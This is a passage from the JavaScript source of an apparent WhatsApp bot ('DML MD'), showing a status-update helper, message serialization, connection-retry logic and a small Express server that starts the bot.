                },
                { quoted },
            );
        };

        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };

        conn.serializeM = mek => sms(conn, mek, global.store);

    } catch (error) {
        isConnecting = false;
        console.error('Error in connectToWA:', error);
        
        if (reconnectAttempts < maxReconnectAttempts) {
            reconnectAttempts++;
            console.log(`Retrying connection in 15 seconds... (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`);
            setTimeout(() => {
                connectToWA();
            }, 15000);
        } else {
            console.error('Max connection attempts reached. Please check your configuration.');
        }
    }
}

// Helper function to check if file exists with timeout
function getSizeMedia(data) {
    return new Promise((resolve) => {
        if (Buffer.isBuffer(data)) {
            resolve(data.length);
        } else {
            resolve(0);
        }
    });
}

app.get("/", (req, res) => {
    res.send("DML MD STARTED ✅");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

// Start the bot after a delay to ensure everything is initialized
setTimeout(() => {
    connectToWA();
}, 4000);
